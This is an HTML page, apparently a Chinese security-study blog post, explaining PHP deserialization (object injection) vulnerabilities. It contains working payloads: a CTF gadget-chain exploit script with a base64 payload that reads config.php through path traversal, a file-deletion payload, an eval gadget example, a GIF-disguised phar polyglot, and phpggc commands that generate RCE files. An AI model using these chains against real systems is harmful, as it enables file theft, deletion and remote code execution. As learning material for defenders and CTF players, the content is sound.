@@ -1,0 +1,746 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>PHP反序列化笔记 | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">PHP反序列化笔记</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-12-21</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
+                    学习笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/xzEJIiyn4G/">
+                    PHP
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="反序列化">反序列化</h1>
+<p>概念整理搬运工，都是看各类网上文章整理好久+自己的学习理解才发布的博文ovo 参考见文末，如果有落下欢迎指正。更新最新版见在个人notion，<s>不懒的话有更新会及时同步到blog的233</s></p>
+<h2 id="概念"><strong>概念</strong></h2>
+<p><strong>序列化</strong></p>
+<p>将各数据类型,压缩为固定格式进行存储,使用的函数是<code>serialize()</code></p>
+<p>之所以需要序列化是因为PHP 文件在执行结束以后就会将对象销毁， 但如果销毁对象要随后使用则需要一种方式来长久保存.</p>
+<p>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</p>
+<blockquote>
+<p>官方解释：</p>
+<ol>
+<li><a href="https://www.php.net/manual/en/function.serialize.php">serialize</a> - Generates a storable representation of a value.</li>
+<li><a href="https://www.php.net/manual/en/function.unserialize.php">unserialize</a> - Creates a PHP value from a stored representation.</li>
+</ol>
+</blockquote>
+<p><strong>反序列化</strong></p>
+<p><strong>将用户可控的数据进行了反序列化</strong>，就是PHP反序列化漏洞。</p>
+<p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞,</p>
+<p>实现反序列化注入</p>
+<ul>
+<li><code>unserialize()</code></li>
+<li>使用协议 <code>phar://</code></li>
+</ul>
+<h2 id="序列化后的格式"><strong>序列化后的格式</strong></h2>
+<figure data-type="image" tabindex="1"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png" alt="https//picture1253331270cosapbeijingmyqcloudcom/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1png" loading="lazy"></figure>
+<ul>
+<li>public:
+<ul>
+<li>长度 = 变量名的字符数量如实</li>
+</ul>
+</li>
+<li>private:
+<ul>
+<li>``%00类名%00属性名`</li>
+<li>长度 = 变量名的长度+类名的长度+2(两个长度的%00)</li>
+</ul>
+</li>
+<li>protected:
+<ul>
+<li><code>%00*%00属性名</code></li>
+<li>长度 = 变量名 + 3</li>
+</ul>
+</li>
+</ul>
+<h2 id="产生的原因"><strong>产生的原因</strong></h2>
+<p>参数可控</p>
+<h2 id="injection-types">Injection Types</h2>
+<p>来源：<a href="https://www.xanhacks.xyz/p/php-gadget-chain/">https://www.xanhacks.xyz/p/php-gadget-chain/</a> 是德国的大佬ovo （想看文章所指的<a href="https://www.dghack.fr/">DG’hAck</a>  2022 edition.，结果都是德文呜呜。</p>
+<h3 id="attribute-injection">Attribute injection</h3>
+<p><strong>什么是属性注入？</strong></p>
+<p>属性注入是指的是，攻击者有可能修改一个instance的属性（attribute）的值。</p>
+<p><strong>如何实现属性注入？</strong></p>
+<pre><code class="language-python">&lt;?php
+
+class User {
+
+    public string $username;
+    public bool $isAdmin;
+
+    public function __construct(string $username)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;isAdmin = false;
+    }
+
+}
+
+$user = new User(&quot;toto&quot;);
+$data = serialize($user);
+
+echo $data;
+</code></pre>
+<p>这里实例instance是 <code>$user</code> （是class User的instance）。</p>
+<p>属性有</p>
+<ul>
+<li>username</li>
+<li>isAdmin</li>
+</ul>
+<p>如果这里攻击者能够操作isAdmin为true的话，便可以导致access control问题</p>
+<p>序列化后为</p>
+<pre><code class="language-python">O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:4:&quot;toto&quot;;s:7:&quot;isAdmin&quot;;b:0;}
+</code></pre>
+<p>攻击者可以修改 isAdmin为1</p>
+<pre><code class="language-python">O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:4:&quot;toto&quot;;s:7:&quot;isAdmin&quot;;b:1;}
+</code></pre>
+<h3 id="object-injection">Object injection</h3>
+<p><strong>属性注入是什么？有什么危害</strong></p>
+<p>不同于直接修改object下的属性，还有一种可能是反序列化其他object的instance。这可能会导致code execution,file writing or reading,calling a protected function…..</p>
+<p><strong>如何实现属性注入</strong></p>
+<p>为了实现这一点，我们要用到gadgets（帮助攻击者实现特定目的）： application代码里已有的PHP gadgets ， 或者，存在于PHP libraries的PHP gadgets。</p>
+<p>总之，实现object injection需要：</p>
+<ul>
+<li>一个PHP gadgets</li>
+<li>可能会用到魔术方法（Magic methods）：参考笔记后面标题</li>
+</ul>
+<p>举例子的话，比如有以下php代码位于application中</p>
+<pre><code class="language-python">class FileManager {
+
+  public string $filePath;
+
+  public function __construct(string $filePath)
+  {
+    $this-&gt;filePath = $filePath;
+  }
+
+  // ...
+
+  public function __destruct()
+  {
+    echo &quot;The file &quot; . $this-&gt;filePath . &quot; will be deleted.&quot; . PHP_EOL;
+    unlink($this-&gt;filePath);
+  }
+
+}
+</code></pre>
+<p>这里 <code>_desturct</code> 在instance被消除时自动调用（被garbage collector调用）：自动调用时会调用函数下的 <code>unlink</code> 删除指定的filePath，所以攻击者可以构造如下payload，实现删除任意文件</p>
+<pre><code class="language-python">unserialize('O:11:&quot;FileManager&quot;:1:{s:8:&quot;filePath&quot;;s:9:&quot;/tmp/toto&quot;;}');
+</code></pre>
+<p><strong>安全研究方向？</strong></p>
+<p>安全研究者会研究Symfony, Laravel, ZendFramework, … 这类的PHP libraries，去寻找gadgets</p>
+<h3 id="更多的object-injection案例dghack2022-edition">更多的Object injection案例：<a href="https://www.dghack.fr/">DG’hAck</a>2022 edition</h3>
+<p>背景提要：攻击者要审计该web服务器上的源代码，从而获取访问权限的方法……目标是config.php文件。</p>
+<p>网站地址：<a href="http://unserialkiller2.chall.malicecyber.com/">http://unserialkiller2.chall.malicecyber.com/</a></p>
+<p>config.php文件内容</p>
+<pre><code class="language-python">if (isset($_REQUEST[&quot;data&quot;])) {
+  try {
+    $decoded = base64_decode($_REQUEST[&quot;data&quot;]);
+    $data = unserialize($decoded);
+  } catch (\Throwable $t) {
+    var_dump($t);
+  }
+}
+</code></pre>
+<p>第一条gadgets位于： ./app/vendor/guzzlehttp/psr7/src/Stream.php下名为Stream的 class中</p>
+<pre><code class="language-php">public function __destruct()
+{
+    $this-&gt;customMetadata-&gt;closeContent($this-&gt;size);
+}
+</code></pre>
+<p>这里closeContent没有被定义。可以调用魔术方法 <code>__call</code></p>
+<p>第二条gadget位于：./app/vendor/guzzlehttp/psr7/src/StreamDecoratorTrait.php 下的名为<code>StreamDecoratorTrait</code> 的 Trait中 → 被CachingStream这个类继承</p>
+<pre><code class="language-php">public function __call($method, array $args)
+{
+    $result = null;
+    if (is_object($this-&gt;stream) &amp;&amp; method_exists($this-&gt;stream, &quot;decorate&quot;)) { //must be true class FnStream
+        if (in_array($method, $this-&gt;getAllowedMethods()) !== true) {
+            $method = $this-&gt;custom_method;
+        }
+        if (is_array($method) !== true) {
+            $method = [$method];
+        }
+
+        $args = $args[0];
+
+        foreach ($method as $_method) {
+            if (is_callable([$this-&gt;stream, $_method])) {
+                $arguments = array_shift($args);
+                $result = $this-&gt;stream-&gt;$_method(...$arguments);
+            }
+        }
+    }
+    // Always return the wrapped object if the result is a return $this
+    return $result === $this-&gt;stream ? $this : $result;
+}
+</code></pre>
+<p>这里 <code>$method</code> 带入为 <code>closeContent</code><br>
+因为closeContent不位于getAllowedMethods(),所以最后 <code>$method</code> 将等于 <code>$this-&gt;custom_method</code></p>
+<p>第三条gadget 位于./app/vendor/guzzlehttp/psr7/src/FnStream.php 的FnStream（包含名为decorate的方法）</p>
+<p>该类有</p>
+<ul>
+<li>decorate 方法</li>
+<li>getContents 方法 ： 读取php文件</li>
+</ul>
+<pre><code class="language-php">public function getContents()
+{
+  $content = &quot;&quot;;
+  if (isset($this-&gt;_fn_getContents) &amp;&amp; is_string($this-&gt;_fn_getContents)) {
+    $file = __DIR__ . $this-&gt;_fn_getContents . &quot;.php&quot;;
+    if ($this-&gt;display_content === true) {
+      readfile($file);
+      echo &quot;Printing interesting file...&quot; . PHP_EOL;
+    }
+  }
+  retur
+</code></pre>
+<blockquote>
+<p><code>display_content</code> must be set to <code>true</code>.</p>
+<p><code>_fn_getContents</code> must be set to <code>/../../../../config</code> (relative path from the <code>FnStream.php</code> file path).</p>
+<p>所以最后：</p>
+<p>$file = &quot;./app/vendor/guzzlehttp/psr7/src&quot; . &quot;/../../../../config&quot; . &quot;.php&quot;;</p>
+<p>$file = &quot;./app/config.php&quot;;</p>
+</blockquote>
+<p>这里，我们本可以设置 <code>display_content</code> 为true，且构造特定的 <code>_fn_getContents</code> 。但是不幸的是FnStream有一个魔术方法 <code>__wakeup</code> ，用来unset它的类下的全部attribute。这里不能直接设置attribute的值，而刚好，FnStream类下有一个叫做 <code>register</code> 的方法允许我们去设置attribute。</p>
+<pre><code class="language-php">public function register(string $name, $callback)
+{
+  if (in_array($name, self::$forbidden_attributes) === true) {
+    throw new \LogicException('FnStream should never register this attribute: ' . $name);
+  }
+  $this-&gt;{$name} = $callback;
+  $this-&gt;methods[] = [$name, $callback];
+}
+</code></pre>
+<p>同时， <code>_fn_getContents</code> 在 <code>forbidden_attributes</code> 内，这里我们调用 <code>allow_attribute</code> 的方法去移除限制</p>
+<pre><code class="language-php">public function allow_attribute(string $name)
+{
+  if (in_array($name, self::$forbidden_attributes, true) === true) {
+    $offset = array_search($name, self::$forbidden_attributes, true);
+    unset(self::$forbidden_attributes[$offset]);
+  }
+}
+</code></pre>
+<p>也就是说gadget第3条需要调用这两个方法来移除限制。</p>
+<p>所有的利用链串在一起，目标是读取config文件，即第三条gadget下我们设想的 <code>$file</code> 应该的值。</p>
+<p>首先函数调入点（入口在这里）是第一条gadget： <code>__desstruct() </code>发现没有定义<code>$this-&gt;customMetadata</code> 下的<code>closeContent</code>，则进行调用  <code>$this→customMetadata</code> 的 <code> _call</code>函数 （在调用 <code>_call</code>函数前，注意会先调用 <code>__construct</code> 方法. 这里把<code>$this→customMetadata</code>设置为CachingStream，并且实现trait <code>StreamDecoratorTrait</code> 。</p>
+<p>在调用 <code>__call</code> 函数前，先在 <code>__construct</code> 下设置：</p>
+<ul>
+<li><code>$this-&gt;stream</code></li>
+<li><code>$this-&gt;custom_method</code></li>
+</ul>
+<p>从而满足第二条gadget下的条件。最后第二条gadget触发，调用 <code>$this-&gt;custom_method</code> 数组内的function （定义在实现该trait的<code>Fnstream</code> class内。即第三条gadget下的register，allow_attribute等方法）。</p>
+<p>最后的代码是</p>
+<pre><code class="language-php">&lt;?php
+
+namespace GuzzleHttp\Psr7;
+
+class FnStream {
+
+    private static $forbidden_attributes = [
+        &quot;_fn___toString&quot;,
+        &quot;_fn_close&quot;,
+        &quot;_fn_detach&quot;,
+        &quot;_fn_getSize&quot;,
+        &quot;_fn_tell&quot;,
+        &quot;_fn_eof&quot;,
+        &quot;_fn_isSeekable&quot;,
+        &quot;_fn_rewind&quot;,
+        &quot;_fn_seek&quot;,
+        &quot;_fn_getContents&quot;,
+        &quot;_fn_isWritable&quot;,
+        &quot;_fn_write&quot;,
+        &quot;_fn_isReadable&quot;,
+        &quot;_fn_read&quot;,
+        &quot;_fn_getMetadata&quot;
+    ];
+
+    public function register(string $name, $callback)
+    {
+        if (in_array($name, self::$forbidden_attributes) === true) {
+            throw new \LogicException('FnStream should never register this attribute: ' . $name);
+        }
+        $this-&gt;{$name} = $callback;
+        $this-&gt;methods[] = [$name, $callback];
+    }
+
+    public function allow_attribute(string $name)
+    {
+        if (in_array($name, self::$forbidden_attributes, true) === true) {
+            $offset = array_search($name, self::$forbidden_attributes, true);
+            unset(self::$forbidden_attributes[$offset]);
+        }
+    }
+
+    public function __wakeup()
+    {
+        unset($this-&gt;_fn_getMetadata);
+        unset($this-&gt;_fn_close);
+        unset($this-&gt;_fn_detach);
+        unset($this-&gt;_fn_eof);
+        unset($this-&gt;_fn_isSeekable);
+        unset($this-&gt;_fn_rewind);
+        unset($this-&gt;_fn___toString);
+        unset($this-&gt;_fn_seek);
+        unset($this-&gt;_fn_isWritable);
+        unset($this-&gt;_fn_write);
+        unset($this-&gt;_fn_getContents);
+        unset($this-&gt;_fn_getSize);
+        unset($this-&gt;_fn_tell);
+        unset($this-&gt;_fn_isReadable);
+        unset($this-&gt;_fn_read);
+        echo &quot;Disabling easy peasy attributes&quot; . PHP_EOL;
+    }
+
+    public function getContents()
+    {
+        $content = &quot;&quot;;
+        if (isset($this-&gt;_fn_getContents) &amp;&amp; is_string($this-&gt;_fn_getContents)) {
+            $file = __DIR__ . $this-&gt;_fn_getContents . &quot;.php&quot;;
+            if ($this-&gt;display_content === true) {
+                readfile($file);
+                echo &quot;Printing interesting file...&quot; . PHP_EOL;
+            }
+        }
+        return $content;
+    }
+
+    public static function decorate() {}
+}
+
+use ReflectionMethod;
+
+trait StreamDecoratorTrait {
+    public function __call($method, array $args)
+    {
+        $result = null;
+        if (is_object($this-&gt;stream) &amp;&amp; method_exists($this-&gt;stream, &quot;decorate&quot;)) {
+            if (in_array($method, $this-&gt;getAllowedMethods()) !== true) {
+                $method = $this-&gt;custom_method;
+            }
+            if (is_array($method) !== true) {
+                $method = [$method];
+            }
+
+            $args = $args[0];
+
+            foreach ($method as $_method) {
+                if (is_callable([$this-&gt;stream, $_method])) {
+                    $arguments = array_shift($args);
+                    $result = $this-&gt;stream-&gt;$_method(...$arguments);
+                }
+            }
+        }
+        // Always return the wrapped object if the result is a return $this
+        return $result === $this-&gt;stream ? $this : $result;
+    }
+
+    public function getAllowedMethods($filter = array('close'))
+    {
+        $classReflection = new \ReflectionClass(&quot;GuzzleHttp\Psr7\FnStream&quot;);
+        $methodsReflections = $classReflection-&gt;getMethods();
+        $methodNames = array_map(function (ReflectionMethod $methodReflection) {
+            return $methodReflection-&gt;getName();
+        }, array_values($methodsReflections));
+        $methodNames = array_diff($methodNames, $filter);
+        return $methodNames;
+    }
+}
+
+class CachingStream
+{
+    use StreamDecoratorTrait;
+
+    public function __construct()
+    {
+        $this-&gt;stream = new FnStream();
+        $this-&gt;custom_method = array(&quot;register&quot;, &quot;allow_attribute&quot;, &quot;register&quot;, &quot;getContents&quot;);
+    }
+}
+
+class Stream {
+    public $size;
+    public $customMetadata;
+
+    public function __construct()
+    {
+        $this-&gt;size = array(
+            array(&quot;display_content&quot;, true),
+            array(&quot;_fn_getContents&quot;),
+            array(&quot;_fn_getContents&quot;, &quot;/../../../../config&quot;),
+            array()
+        );
+        $this-&gt;customMetadata = new CachingStream();
+    }
+
+    public function __destruct()
+    {
+        $this-&gt;customMetadata-&gt;closeContent($this-&gt;size);
+    }
+}
+
+$GENERATE = true;
+
+if ($GENERATE) {
+    $stream = new Stream();
+    $data = serialize($stream);
+
+    echo $data . PHP_EOL;
+    echo base64_encode($data) . PHP_EOL;
+} else {
+    $data = base64_decode(&quot;Tzo2OiJTdHJlYW0iOjI6e3M6NDoic2l6ZSI7YTo0OntpOjA7YToyOntpOjA7czoxNToiZGlzcGxheV9jb250ZW50IjtpOjE7YjoxO31pOjE7YToxOntpOjA7czoxNToiX2ZuX2dldENvbnRlbnRzIjt9aToyO2E6Mjp7aTowO3M6MTU6Il9mbl9nZXRDb250ZW50cyI7aToxO3M6MTk6Ii8uLi8uLi8uLi8uLi9jb25maWciO31pOjM7YTowOnt9fXM6MTQ6ImN1c3RvbU1ldGFkYXRhIjtPOjEzOiJDYWNoaW5nU3RyZWFtIjoyOntzOjY6InN0cmVhbSI7Tzo4OiJGblN0cmVhbSI6Mjp7czoxNToiX2ZuX2dldENvbnRlbnRzIjtzOjE5OiIvLi4vLi4vLi4vLi4vY29uZmlnIjtzOjE1OiJkaXNwbGF5X2NvbnRlbnQiO2I6MTt9czoxMzoiY3VzdG9tX21ldGhvZCI7YTo0OntpOjA7czo4OiJyZWdpc3RlciI7aToxO3M6MTU6ImFsbG93X2F0dHJpYnV0ZSI7aToyO3M6ODoicmVnaXN0ZXIiO2k6MztzOjExOiJnZXRDb250ZW50cyI7fX19&quot;);
+    unserialize($data);
+}
+</code></pre>
+<h2 id="魔术方法"><strong>魔术方法</strong></h2>
+<blockquote>
+<p><a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic methods</a> are special methods which override PHP’s default’s action when certain actions are performed on an object.</p>
+</blockquote>
+<h3 id="一览">一览:</h3>
+<p>是一种在类序列化或反序列化中自动完成的一些操作.</p>
+<p>(1**)<strong>construct()</strong>：**当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。<br>
+(2)wakeup() ：unserialize()时会自动调用<br>
+(3)destruct()：当对象被销毁时会自动调用。<br>
+(4)toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>
+(5)get() **😗*当从不可访问的属性读取数据<br>
+(6)call(): 在对象上下文中调用不可访问的方法时触发</p>
+<p>(7)sleep():在一个对象被序列化之前调用；</p>
+<h3 id="destruct举例">destruct举例</h3>
+<p>案例1: 修改destruct下的变量为另一类</p>
+<p>原始代码如下:</p>
+<pre><code class="language-php">&lt;?php
+class K0rz3n {
+    private $test;
+    public $K0rz3n = &quot;i am K0rz3n&quot;;
+    function __construct() {
+        $this-&gt;test = new L();
+    }
+
+    function __destruct() {
+        $this-&gt;test-&gt;action();
+    }
+}
+
+class L {
+    function action() {
+        echo &quot;Welcome to XDSEC&quot;;
+    }
+}
+
+class Evil {
+
+    var $test2;
+    function action() {
+        eval($this-&gt;test2);
+    }
+}
+
+unserialize($_GET['test']);
+</code></pre>
+<p>查找后的共同点如下:</p>
+<ul>
+<li>发现<code>Evil</code>类调用了action方法(使用了eval)</li>
+<li><code>K0rz3n</code> 类在<code>destruct</code> 下自动调用了test下的action方法</li>
+</ul>
+<p>入手点:</p>
+<ul>
+<li>修改construct下的test</li>
+</ul>
+<p>修改后的<code>K0rz3n</code> 类如下:</p>
+<pre><code class="language-php">&lt;?php
+class K0rz3n {
+    private $test;
+    function __construct() {
+        $this-&gt;test = new Evil;
+    }
+}
+
+class Evil {
+
+    var $test2 = &quot;phpinfo();&quot;;
+
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitleda_0.png" alt="Untitled" loading="lazy"></figure>
+<h2 id="pop链">POP链</h2>
+<p>POP 面向属性编程(Property-Oriented Programing)</p>
+<p><strong>概念</strong></p>
+<p><strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p>
+<h3 id="案例">案例</h3>
+<p>如下文章</p>
+<ul>
+<li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/</a></li>
+</ul>
+<h2 id="phar">phar://</h2>
+<p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<p>简述:phar触发反序列化漏洞的机理主要是由于:phar文件会存储用户自定义的meta-data.</p>
+<h3 id="敏感函数">敏感函数</h3>
+<ul>
+<li><code>file_exists()</code></li>
+<li><code>is_dir()</code></li>
+</ul>
+<p>更多:</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitled%201a_1.png" alt="Untitled" loading="lazy"></figure>
+<h3 id="触发前提">触发前提</h3>
+<ul>
+<li>php.ini 下的 <code>phar.readonly</code> 设置为 <code>off</code></li>
+</ul>
+<h3 id="文件结构">文件结构</h3>
+<p>由四部分组成:</p>
+<ul>
+<li>stub :格式固定,必须以 <code>xxx&lt;?php xxx; HALT_COMPILER();?&gt;</code> 必须以 `__HALT_COMPILER();?&gt; 结尾</li>
+<li>manifest: 被压缩文件的权限,属性等信息.以序列化的形式存储用户自定义的meta-data</li>
+<li>contents: 被压缩文件的内容</li>
+<li>signature: 签名,放文末</li>
+</ul>
+<h3 id="示例">示例</h3>
+<pre><code class="language-reason">&lt;?php
+    class TestObject {
+    }
+
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<h3 id="伪造其他格式文件">伪造其他格式文件</h3>
+<p>因为phar文件被php识别主要是:</p>
+<ul>
+<li>文件头stub</li>
+<li><code>__HALT_COMPILER();?&gt;</code></li>
+</ul>
+<p>所以只需要:</p>
+<ul>
+<li>添加任意文件头</li>
+<li>修改后缀名</li>
+</ul>
+<p>示例</p>
+<pre><code class="language-reason">&lt;?php
+    class TestObject {
+    }
+
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+    $o = new TestObject();
+    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>示例增加了Gif文件头 <code>GIF89a</code></p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitled%202a_2.png" alt="Untitled" loading="lazy"></figure>
+<p>如图,生成的phar文件被识别为gif,修改后缀的poc可以参考hackerone的报告:<a href="https://hackerone.com/reports/921288">https://hackerone.com/reports/921288</a></p>
+<h3 id="phar-自动化生成工具">phar:// 自动化生成工具</h3>
+<p>可以使用phpgcc</p>
+<p>具体参考文章:<a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A</a></p>
+<p><strong>生成phar文件,并将反序列化利用链插入</strong></p>
+<pre><code class="language-bash">php phpggc -o evil.phar Monolog/RCE6 system id
+</code></pre>
+<p><strong>伪造图片格式</strong></p>
+<p>参数 <code>-pj</code></p>
+<pre><code class="language-bash">php phpggc -pj example.jpg -o evil.jpg Monolog/RCE6 system whoami
+</code></pre>
+<h3 id="限制条件">限制条件</h3>
+<p>phar:// 反序列化利用,遇到以下几个条件会受限:</p>
+<ul>
+<li>php 8.0 及以上</li>
+<li>phar文件伪造图片格式,如果图片使用GD库处理过,则phar内容会被处理掉.</li>
+</ul>
+<h3 id="php解析phar所支持的文件格式">PHP解析phar所支持的文件格式</h3>
+<p>一共支持三种:</p>
+<ul>
+<li>zip
+<ul>
+<li>文件头尾都可以有脏数据,通过修复偏移量获得一个合法的zip文件(取决于zip解析器,phar解析器会检查文件头格式)</li>
+</ul>
+</li>
+<li>tar
+<ul>
+<li>控制文件头,即可构造合法的tar文件,即使文件尾有垃圾字符</li>
+</ul>
+</li>
+<li>phar
+<ul>
+<li>必须控制文件尾，但不需要控制文件头。PHP在解析时会在文件内查找<code>&lt;?php __HALT_COMPILER(); ?&gt;</code><br>
+这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串<code>GBMB</code><br>
+结尾。</li>
+</ul>
+</li>
+</ul>
+<h3 id="不同场景下使用phar">不同场景下使用phar</h3>
+<ul>
+<li>使用了less扩展(向后兼容的CSS扩展语言):
+<ul>
+<li>利用文章:<a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="reference">Reference</h2>
+<p>笔记&amp;反序列化教程：</p>
+<ul>
+<li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/</a></li>
+<li><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></li>
+<li><a href="https://www.xanhacks.xyz/p/php-gadget-chain/">https://www.xanhacks.xyz/p/php-gadget-chain/</a></li>
+<li><a href="https://portswigger.net/web-security/deserialization">https://portswigger.net/web-security/deserialization</a></li>
+<li><a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A</a></li>
+</ul>
+<p>不错的report （待补充收集）</p>
+<ul>
+<li><a href="https://hackerone.com/reports/921288">https://hackerone.com/reports/921288</a></li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/wo-hao-kun-11-yue-de-shui-wen-yi-fen/">
+              <h3 class="post-title">
+                下一篇：我好困 11月的水文一份
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
